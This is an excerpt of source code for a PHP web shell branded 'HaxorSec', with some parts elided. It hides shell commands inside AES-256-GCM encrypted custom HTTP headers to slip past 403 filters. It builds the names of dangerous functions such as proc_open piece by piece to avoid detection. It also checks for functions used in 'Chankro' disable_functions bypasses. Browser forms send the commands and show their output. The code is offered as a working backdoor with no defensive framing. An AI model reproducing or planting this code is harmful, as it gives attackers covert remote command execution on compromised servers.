...
$mailStatus = function_exists('mail') ? 'ON' : 'OFF';
$mbSendMailStatus = function_exists('mb_send_mail') ? 'ON' : 'OFF';
$errorLogStatus = function_exists('error_log') ? 'ON' : 'OFF';
$imapMailStatus = function_exists('imap_mail') ? 'ON' : 'OFF';
$putenvStatus = function_exists('putenv') ? 'ON' : 'OFF';

echo '
<div style="background-color:#f0f0f0; border:1px solid #ccc; padding:15px; margin:10px; border-radius:8px; font-family:monospace;">
    <h3 style="margin-top:0; color:#333;">Environment Function Status - HaxorSec</h3>
    <table style="width:100%; border-collapse:collapse; margin-bottom:15px;">
        <tr>
            <th style="text-align:left; padding:8px; border-bottom:1px solid #ddd;">Function</th>
            <th style="text-align:left; padding:8px; border-bottom:1px solid #ddd;">Status</th>
        </tr>
        <tr>
            <td style="padding:8px;">mail()</td>
            <td style="padding:8px; color:'.($mailStatus === 'ON' ? 'green' : 'red').'">['.$mailStatus.']</td>
        </tr>
        <tr>
            <td style="padding:8px;">mb_send_mail()</td>
            <td style="padding:8px; color:'.($mbSendMailStatus === 'ON' ? 'green' : 'red').'">['.$mbSendMailStatus.']</td>
        </tr>
        <tr>
            <td style="padding:8px;">error_log()</td>
            <td style="padding:8px; color:'.($errorLogStatus === 'ON' ? 'green' : 'red').'">['.$errorLogStatus.']</td>
        </tr>
        <tr>
            <td style="padding:8px;">imap_mail()</td>
            <td style="padding:8px; color:'.($imapMailStatus === 'ON' ? 'green' : 'red').'">['.$imapMailStatus.']</td>
        </tr>
        <tr>
            <td style="padding:8px;">putenv()</td>
            <td style="padding:8px; color:'.($putenvStatus === 'ON' ? 'green' : 'red').'">['.$putenvStatus.']</td>
        </tr>
    </table>

    <h4 style="margin-bottom:8px;">Command Explanation</h4>
    <ul style="padding-left:20px; margin:0;">
        <li><strong style="color:#007bff;">BYPASS COMMAND:</strong> Bypassing POST using CHANKRO technique</li>
        <li><strong style="color:#28a745;">NORMAL COMMAND:</strong> Standard system command execution</li>
        <li><strong style="color:#fd7e14;">BYPASS 403 COMMAND:</strong> Command execution CHANKRO using encrypted headers with AES-256-GCM to bypass 403</li>
        <li><strong style="color:#dc3545;">403 COMMAND:</strong> Normal command wrapped with encrypted header AES-256-GCM to bypass 403 restrictions</li>
    </ul>
</div>';
...
function get_custom_header($headerName) {
    ...
    foreach ($_SERVER as $key => $value) {
        if (stripos($key, 'HTTP_') === 0) {
            ...
            if (strcasecmp($normalizedKey, $headerName) === 0) {
                return $value;
            }
        }
    }
...
$iv  = hex2bin('0a0b0c0d0e0f101112131415'); 

function decryptAESGCM($data, $key, $iv) {
    if (strlen($data) < 16) return false;
    $tag = substr($data, -16);
    $ciphertext = substr($data, 0, -16);
    return openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && get_custom_header('X-biasa') !== null) {
    $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
    $pc = "f"."c"."l"."o"."s"."e";
    $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
    $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $decoded = base64_decode(get_custom_header('X-biasa'));
    $command =  decryptAESGCM($decoded, $key, $iv);
    if ($command === false) {
        echo '<textarea class="result-box" id="command_biasa">Error: Decryption failed or authentication failed.</textarea>';
        exit;
    }
    $descriptorspec = [
        0 => ['pipe', 'r'],
    ...
    if (is_resource($process)) {
        ...
        $ppc($process);
        if (!empty($errors)) {
            $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box" id="command_biasa">' . $htm($errors) . '</textarea>';
            echo $viewCommandResult;

        } else {
            $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box" id="command_biasa">' . $htm($output) . '</textarea>';
            echo $viewCommandResult;
        }
    } else {
        $viewCommandResult = 'Result:</p><textarea class="result-box" id="command_biasa">Error: Failed to execute command! </textarea>';
        echo $viewCommandResult;
    }

    exit;
}elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && get_custom_header('X-haxorsec') !== null) {
    ...
    $decoded = base64_decode(get_custom_header('X-haxorsec'));
    $cmdd = decryptAESGCM($decoded, $key, $iv);

    $meterpreter = $en($cmdd." > test.txt");
    $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box" id="command_result">' .
    "base64 : $meterpreter\n" .
    ...
    <td>
        <center>
            ...
            <form onsubmit="event.preventDefault(); sendCommand();">
                <input type="text" id="cmd_inputt" placeholder="Command">
                <input type="submit" value="Run Command">
            </form>
        </center>
    </td>
    ...
    <td>
        <center>
            ...
            <form onsubmit="event.preventDefault(); send();">
                <input type="text" id="cmd_biasaa" placeholder="Command">
                <input type="submit" value="Run Command">
            </form>
        </center>
    </td>
...
const ivHex  = '0a0b0c0d0e0f101112131415'; 
...
async function sendCommand() {
    const cmdInput = document.getElementById("cmd_inputt").value;
    const encryptedCmd = await encryptAES(cmdInput);

    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'X-haxorsec': encryptedCmd
        }
    })
    ...
    .then(html => {
        ...
        const textarea = doc.querySelector('textarea#command_result');

        if (textarea) {
            const outputHtml = `<hr><p>Result: </p><textarea class="result-box">${textarea.value}</textarea>`;
            document.getElementById("output").innerHTML = outputHtml;
        } else {
            document.getElementById("output").innerHTML = `<p style="color:red;">No command output found.</p>`;
        }
    });
}

async function send() {
    const cmdInput = document.getElementById("cmd_biasaa").value;
    const encryptedCmd = await encryptAES(cmdInput);

    fetch(window.location.href, {
        method: 'POST',
        headers: {
            'X-biasa': encryptedCmd
        }
    })
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const textarea = doc.querySelector('textarea#command_biasa');
